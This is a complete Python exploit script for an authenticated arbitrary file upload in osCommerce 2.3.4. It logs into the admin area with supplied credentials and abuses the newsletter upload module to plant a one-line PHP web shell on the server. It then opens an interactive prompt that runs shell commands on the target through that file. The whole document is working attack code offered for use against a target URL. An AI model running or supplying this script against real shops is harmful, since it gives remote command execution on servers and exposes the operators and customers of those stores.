#!/usr/bin/env python3
import argparse, sys, requests, os, time
from urllib import parse

cookiejar = {}

def authenticate(user, passwd, url):
    session = requests.Session()
    session.get(f"{url}login.php", allow_redirects=False)
    params = {'action': 'process'}
    data = {"username": user, "password": passwd}
    r = session.post(url + "login.php", data=data, params=params, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Successfully authenticated to osCommerce!")
        return session
    else:
        print("[-] Unable to authenticate to osCommerce! Please check the provided credentials")
        sys.exit()


def exploit(session, url, path):
    news = url + "newsletters.php"
    r = session.get(news, params={"actions":"new"})
    payload = {
        'module': 'upload',
        'title': 'uploaded_fname',
        'content': './'
    }
    r = session.post(news, params={"action": "insert"}, data=payload, allow_redirects=False)
    try:
        newsID = parse.urlparse(r.headers['Location']).query[4:]
        print(f"[+] Successfully created a news letter, nID: {newsID}")
    except Exception as e:
        print(f"Error: {e}")
        print("[-] Unable to create a new newsletter..")
        sys.exit()
    r = session.post(news, params={"action": "lock", "nID": newsID})
    print(f"[+] Successfully locked the newsletter. Attempted file upload!")
    filename = "shell.php"
    print(f"[+] Writing payload to {filename}")
    with open(filename, "w") as f:
        f.write("<?php passthru($_GET['c'])?>")
    files = {
        'upload_fname': open(filename)
    }
    print(f"[*] Attempting to upload file")
    r = session.post(news, params={"action": "send", "nID": newsID}, files=files)
    cookiejar = session.cookies.get_dict()
    print(newsID)
    os.remove(filename)
    print("[*] Checking if file has successfully uploaded..")
    shellURL = url + filename
    r = requests.get(shellURL)
    if r.status_code == 200:
        print(f"[+] File successfully uploaded at {shellURL}")
    else:
        print(f"[-] File upload failed! {r.status_code}")
        sys.exit()
    return shellURL



def commandExec(shell, session):
    c = ""
    while c != "exit":
        c = input("#> ")
        r = session.get(f"{shell}?c={c}")
        print(r.text + "\n")

def main(args):
    if not args.path:
        adminPath = "/catalog/admin"
    else:
        adminPath = args.path
    if args.url[-1] != "/" and adminPath[0] == "/":
        url = args.url + adminPath
    elif args.url[-1] == "/" and adminPath[0] == "/":
        url = args.url + adminPath[1:]
    elif args.url[-1] == "/" and adminPath[0] != "/":
        url = args.url + adminPath
    else:
        url = args.url + "/" + adminPath
    if url[-1] != "/":
        url += "/"
    session = authenticate(args.user, args.passwd, url)
    shellURL = exploit(session, url, args.path)
    commandExec(shellURL, authenticate(args.user, args.passwd, url))

usage = f"""{sys.argv[0]} -u <URL> -U <user> -P <password> -p (path)
Example: {sys.argv[0]} -u http://target.com/path/to/osCommerce/ -U admin -P admin
.
.
Use -h for more
"""
parser = argparse.ArgumentParser(description="\nosCommerce 2.3.4 Authenticated Arbitrary File Upload", usage=usage)
parser.add_argument('-u', '--url', help="The target URL, including path to osCommerice installation", required=True)
parser.add_argument('-U', '--user', help="Username credential", required=True)
parser.add_argument('-P', '--passwd', help="Password credential", required=True)
parser.add_argument('-p', '--path', help="Path for osCommerce admin area, default is /catalog/admin", required=False)
args = parser.parse_args()

main(args)
